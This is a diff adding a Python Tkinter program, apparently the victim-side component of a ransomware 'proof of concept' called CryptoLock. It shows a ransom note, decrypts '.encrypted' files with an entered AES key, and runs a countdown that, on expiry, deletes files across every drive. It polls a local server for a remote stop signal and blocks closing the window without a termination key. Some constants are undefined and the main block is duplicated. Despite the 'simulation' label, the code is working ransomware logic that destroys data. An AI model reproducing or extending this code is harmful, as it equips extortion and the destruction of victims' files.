@@ -1,0 +1,428 @@
+# Part 1: Initialization and Setup
+
+import os
+import sys
+import requests
+import json
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+import base64
+import uuid
+from datetime import datetime, timedelta
+import time
+import ctypes
+import logging
+import threading
+import tkinter as tk
+from tkinter import filedialog, messagebox, simpledialog
+from tkinter import ttk
+from PIL import Image, ImageTk
+
+# Part 6: DecryptorApp Class and Initialization
+
+# Step 28: Setting up the main DecryptorApp class
+class DecryptorApp(tk.Tk):
+    # --- Initialization & UI Setup ---
+    def __init__(self):
+        super().__init__()
+        self.iconbitmap(ICON_PATH)
+        self.title("CryptoLock")
+        self.configure(bg='black')
+        self.geometry("900x800")
+        self.timer_update_id = None
+        self.stop_deletion = False
+        self.deletion_stopped = False
+        self.initialize_ui()
+        self.protocol("WM_DELETE_WINDOW", self.on_close_window)
+        self.stop_event = threading.Event()
+
+        self.machine_id = load_machine_id()
+        if self.machine_id:
+            self.load_timer_state()
+        else:
+            messagebox.showerror("Error", "No machine ID found. The application will exit.")
+            self.destroy()
+
+        threading.Thread(target=self.check_for_remote_stop_signal, args=(self.machine_id,), daemon=True).start()
+
+    # Step 29 : Function to check for remote stop signal
+    def check_for_remote_stop_signal(self, machine_id, check_interval=10):
+        url = f"http://localhost/cryptlock/includes/api/check_stop_signal.php?machine_id={machine_id}"
+        while not self.stop_deletion:
+            try:
+                response = requests.get(url, timeout=10)
+                response.raise_for_status()
+                data = response.json()
+                if data.get("stop_signal") == "1":
+                    self.stop_deletion_process_remotely()
+                    break
+            except requests.exceptions.RequestException as e:
+                pass
+            time.sleep(check_interval)
+
+    # Step 29.1: Function to stop the deletion process remotely
+    def stop_deletion_process_remotely(self):
+        if not self.stop_deletion:
+            self.stop_deletion = True
+            self.deletion_stopped = True
+            self.stop_event.set()
+            self.log("Deletion process stopped by remote command.", 'blue')
+            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
+                self.deletion_dialog.destroy()
+                self.deletion_dialog = None
+
+    # Step 30: Function to initialize the UI
+    def initialize_ui(self):
+        self.iconbitmap(ICON_PATH)
+        logo_image = Image.open(LOGO_PATH).resize((200, 200))
+        logo_photo = ImageTk.PhotoImage(logo_image)
+        frame = tk.Frame(self, bg='black')
+        frame.pack(pady=(20, 20))
+        logo_label = tk.Label(frame, image=logo_photo, bg='black')
+        logo_label.image = logo_photo
+        logo_label.pack(side=tk.LEFT, padx=(20, 10))
+        ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
+        | Attention: Your Files Are Encrypted | \n\n
+         To restore access to your data, you must enter the decryption key.\n\n
+         """
+
+        ransom_note_label = tk.Text(frame, bg='black', font=('Helvetica', 12), wrap='word', height=16, width=60, borderwidth=0)
+        ransom_note_label.pack(side=tk.LEFT, padx=(10, 20))
+        ransom_note_label.insert(tk.END, " Proof of Concept: Ransomware Simulation \n", "center_red")
+        ransom_note_label.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_red")
+        ransom_note_label.tag_configure("center", justify='center')
+        ransom_note_label.tag_configure("center_red", justify='center', foreground="red")
+        ransom_note_label.tag_configure("center_green", justify='center', foreground="green")
+        ransom_note_label.tag_configure("center_white", justify='center', foreground="white")
+        ransom_note_label.tag_configure("center_yellow", justify='center', foreground="yellow")
+        ransom_note_label.tag_add("center", "1.0", "1.end")
+        ransom_note_label.tag_add("center_red", "1.0", "2.end")
+        ransom_note_label.tag_add("center_green", "4.0", "4.end")
+        ransom_note_label.tag_add("center_white", "5.0", "6.end")
+        ransom_note_label.tag_add("center_yellow", "8.0", "9.end")
+        ransom_note_label.configure(state='disabled')
+
+        self.timer_label = tk.Label(self, text="", fg='red', bg='black', font=('Helvetica', 12))
+        self.timer_label.pack(pady=(10, 10))
+
+        self.setup_key_frame()
+        self.setup_log_frame()
+        self.setup_progress_frame()
+
+    # Step 35: Setup the key frame
+    def setup_key_frame(self):
+        key_frame = tk.Frame(self, bg='black')
+        key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
+        self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
+        self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10, 0), ipady=8)
+        tk.Button(key_frame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica', 12),
+                  relief=tk.FLAT, command=self.start_decryption).pack(side=tk.RIGHT, padx=(10, 0))
+
+    # Step 36: Setup the log frame
+    def setup_log_frame(self):
+        log_frame = tk.Frame(self, bg='black')
+        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        banner_text = "Welcome to CryptoLock - [HACKER MODE]"
+        banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
+        banner_label.pack(side=tk.TOP, fill=tk.X)
+
+        self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
+        self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+
+        scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)
+        scrollbar.pack(side="right", fill="y")
+        self.log_listbox.config(yscrollcommand=scrollbar.set)
+
+    # Step 37: Setup the progress frame
+    def setup_progress_frame(self):
+        self.progress_frame = tk.Frame(self, bg='black')
+        self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
+        style = ttk.Style()
+        style.theme_use('clam')
+        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
+        self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar",
+                                        orient=tk.HORIZONTAL, length=400, mode='determinate')
+        self.progress.pack(fill=tk.X, expand=True)
+        self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='white')
+        self.progress_label.pack()
+
+    # --- Logging ---
+    # Step 33: Function to log messages
+    def log(self, message, color='green'):
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        formatted_message = f"[{timestamp}] {message}"
+        if self.winfo_exists():
+            self.after(0, lambda: self._update_log_listbox(formatted_message, color))
+    # Step 34: Function to update the log listbox
+    def _update_log_listbox(self, message, color):
+        self.log_listbox.insert(tk.END, message)
+        self.log_listbox.itemconfig(tk.END, {'fg': color})
+        self.log_listbox.see(tk.END)
+
+    # --- Timer & State Management ---
+    # Step 48: Function to load the timer state
+    def load_timer_state(self):
+        try:
+            with open(TIMER_STATE_FILE, 'r') as f:
+                state = f.read().strip()
+                if not state:
+                    self.timer_label.config(text="No active countdown.")
+                    self.closing_time = None
+                else:
+                    self.closing_time = datetime.fromtimestamp(float(state))
+                    if datetime.now() >= self.closing_time:
+                        self.timer_label.config(text="Time's up! Application will close soon.")
+                        messagebox.showinfo("Notification", "Time has expired. Initiating deletion sequence.")
+                        self.begin_deletion_sequence()
+                    else:
+                        self.update_timer()
+        except (FileNotFoundError, ValueError):
+            self.reset_timer()
+    
+    # Step 49: Function to update the timer
+    def update_timer(self):
+        remaining_time = self.closing_time - datetime.now()
+        if remaining_time.total_seconds() > 0:
+            self.timer_label.config(text=f"Time remaining: {str(remaining_time).split('.')[0]}")
+            self.timer_update_id = self.after(1000, self.update_timer)
+        else:
+            self.timer_label.config(text="Time's up! Application will close soon.")
+            self.begin_deletion_sequence()
+    
+    # Step 50: Function to reset the timer
+    def reset_timer(self):
+        self.closing_time = datetime.now() + timedelta(minutes=5)
+        with open(TIMER_STATE_FILE, 'w') as f:
+            f.write(str(self.closing_time.timestamp()))
+        self.update_timer()
+    
+    # Step 51: Function to reset the timer state
+    def reset_timer_state(self):
+        with open(TIMER_STATE_FILE, 'w') as f:
+            f.write("")
+        self.timer_label.config(text="No active countdown.")
+    
+    # Step 52: Function to delete timer state file
+    def delete_timer_state_file(self):
+        try:
+            os.remove(TIMER_STATE_FILE)
+        except FileNotFoundError:
+            pass
+    
+    # Step 53: Function to delete timer and machine ID files
+    def delete_timer_and_machine_id_files(self):
+        try:
+            os.remove(TIMER_STATE_FILE)
+        except FileNotFoundError:
+            pass
+        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
+        for drive in drives:
+            machine_id_path = os.path.join(drive, "Machine_id.txt")
+            try:
+                os.remove(machine_id_path)
+            except FileNotFoundError:
+                pass
+
+    # --- Decryption Process ---
+    # Step 38: Function to start the decryption process
+    def start_decryption(self):
+        decryption_key = self.key_entry.get()
+        if decryption_key:
+            try:
+                key = base64.b64decode(decryption_key)
+                self.log("Starting scan and decryption automatically.")
+                if self.timer_update_id:
+                    self.after_cancel(self.timer_update_id)
+                    self.timer_update_id = None
+                threading.Thread(target=self.scan_and_decrypt, args=(key,), daemon=True).start()
+            except base64.binascii.Error:
+                messagebox.showerror("Error", "Invalid decryption key. Please check the key and try again.")
+        else:
+            messagebox.showerror("Error", "Decryption key is not provided.")
+
+    # Step 39: Function to scan and decrypt files
+    def scan_and_decrypt(self, key):
+        encrypted_files = []
+        drives = [f"{c}:\\" for c in "DEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{c}:\\")]
+
+        for drive in drives:
+            self.log(f"Scanning drive {drive} for encrypted files.")
+            for dp, dn, filenames in os.walk(drive):
+                if any(excluded in dp for excluded in {'System Volume Information', '$RECYCLE.BIN', 'Windows'}):
+                    continue
+                for f in filenames:
+                    if f.endswith('.encrypted'):
+                        encrypted_files.append(os.path.join(dp, f))
+                        self.log(f"Found encrypted file: {os.path.join(dp, f)}")
+        total_files = len(encrypted_files)
+        self.safe_update_progress(0, total_files)
+        decrypted_count = 0
+        for file_path in encrypted_files:
+            if self.decrypt_file(file_path, key):
+                decrypted_count += 1
+                self.safe_update_progress(decrypted_count, total_files)
+
+        if decrypted_count == total_files:
+            self.after(0, self.stop_timer_and_show_success)
+        else:
+            self.after(0, lambda: messagebox.showerror("Decryption Failed",
+                                                       "Failed to decrypt one or more files. Please check the decryption key and try again."))
+
+    # Step 47: Function to decrypt a single file
+    def decrypt_file(self, file_path, key):
+        try:
+            with open(file_path, 'rb') as f:
+                iv = f.read(16)
+                encrypted_data = f.read()
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+            original_file_path = file_path.rsplit('.encrypted', 1)[0]
+            with open(original_file_path, 'wb') as f:
+                f.write(decrypted_data)
+            os.remove(file_path)
+            self.log(f"Successfully Decrypted {file_path}")
+            return True
+        except Exception as e:
+            self.log(f"Failed to decrypt {file_path}:[Error:] {str(e)}")
+            return False
+        
+    # Step 41: Function to safely update the progress bar
+    def safe_update_progress(self, value, maximum):
+        self.after(0, lambda: self.update_progress_bar(value, maximum))
+
+    # Step 42: Function to update the progress bar
+    def update_progress_bar(self, value, maximum):
+        self.progress["value"] = value
+        self.progress["maximum"] = maximum
+        percentage = 100 * (value / maximum) if maximum else 0
+        self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}%")
+
+    # Step 43: Function to stop the timer and show success message
+    def stop_timer_and_show_success(self):
+        if self.timer_update_id:
+            self.after_cancel(self.timer_update_id)
+            self.timer_update_id = None
+
+        success_message = "All files decrypted successfully. Thank you for your patience."
+        messagebox.showinfo("Decryption Complete", success_message, parent=self)
+
+        self.delete_timer_and_machine_id_files()
+        self.delete_timer_state_file()
+        countdown_dialog = CountdownDialog(self, 10, self.close_application)
+        countdown_dialog.mainloop()
+
+    # Step 44: Function to start closing countdown
+    def start_closing_countdown (self):
+        countdown_dialog = CountdownDialog(self, 15, self.close_application)
+        countdown_dialog.grab_set()
+        countdown_dialog.mainloop()
+
+    # --- Deletion Process ---
+    # Step 54: Function to begin the deletion sequence
+    def begin_deletion_sequence(self):
+        if not self.stop_deletion:
+            self.log("Time is up. Starting file deletion sequence.", 'red')
+            self.deletion_dialog = DeletionCountdownDialog(self, self.stop_deletion_process)
+            self.deletion_process()
+
+    # Step 55: Function to handle the deletion process
+    def deletion_process(self):
+        self.log("Deletion process initiated.", 'yellow')
+        self.deletion_thread = threading.Thread(target=self.delete_files_with_timing, daemon=True)
+        self.deletion_thread.start()
+
+    # Step 56: Function to delete files with timing
+    def delete_files_with_timing(self):
+        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
+        excluded_directories = {'System Volume Information', '$RECYCLE.BIN', 'Windows'}
+        excluded_files = {'Machine_id.txt', 'READ_ME_FOR_DECRYPTION.txt'}
+
+        def handle_deletion(directory):
+            for current_directory, directories, files in os.walk(directory, topdown=False):
+                if any(excluded in current_directory for excluded in excluded_directories):
+                    continue
+
+                for file in files:
+                    if file in excluded_files:
+                        continue
+                    file_path = os.path.join(current_directory, file)
+                    if not os.access(file_path, os.W_OK):
+                        self.log(f"Access denied to {file_path}", 'Skipping')
+                        continue
+
+                    if self.stop_event.is_set():
+                        self.log("Stop signal received. Ending deletion process.", 'orange')
+                        return
+                    
+                    try:
+                        os.remove(file_path)
+                        self.log(f"Deleted file: {file_path}")
+                    except PermissionError as e:
+                        self.log(f"Permission Error: {e}. Skipping file: {file_path}")
+                    
+                    time.sleep(5)
+
+                    if not directories and not files:
+                        self.log(f"All files have been deleted from: {current_directory}")
+        
+        for drive in drives:
+            d_data_path = os.path.join(drive, 'D_Data')
+            if os.path.exists(d_data_path):
+                self.log(f"Starting deletion in {d_data_path}")
+                handle_deletion(d_data_path)
+                if self.stop_event.is_set():
+                    return
+                
+        for drive in drives:
+            self.log(f"Starting deletion in {drive}")
+            handle_deletion(drive)
+            if self.stop_event.is_set():
+                break
+
+    # Step 31: Function to stop the deletion process
+    def stop_deletion_process(self):
+        if not self.stop_deletion:
+            self.stop_deletion = True
+            self.deletion_stopped = True
+            self.stop_event.set()
+            self.log("Deletion process stopped by secondary termination key.", 'white')
+            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
+                self.deletion_dialog.destroy()
+
+    # Step 32: Function to check the secondary termination key
+    def check_secondary_termination(self):
+        response = simpledialog.askstring("Stop Deletion", "Enter the secondary termination key:", parent=self)
+        if response == SECONDARY_TERMINATION_KEY:
+            self.stop_deletion_process()
+        else:
+            messagebox.showerror("Error", "Incorrect secondary termination key.")
+
+    # --- Termination & Dialogs ---
+    # Step 46: Function to handle window close event
+    def on_close_window(self):
+        dialog = TerminationKeyDialog(self, ICON_PATH)
+        self.wait_window(dialog)
+        if dialog.result == TERMINATION_KEY:
+            self.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect termination key.")
+            return
+        
+    # Step 57: Check if the Machine ID exists
+    def close_application(self):
+        try:
+            self.destroy()
+        except Exception as e:
+            print(f"Exception when closing: {e}")
+
+# Part 10: Main Execution
+#Step 57: Check if the Machine ID exists
+if __name__ == "__main__":
+    app = DecryptorApp()
+    app.mainloop()
+if __name__ == "__main__":
+    app = DecryptorApp()
+    app.mainloop()
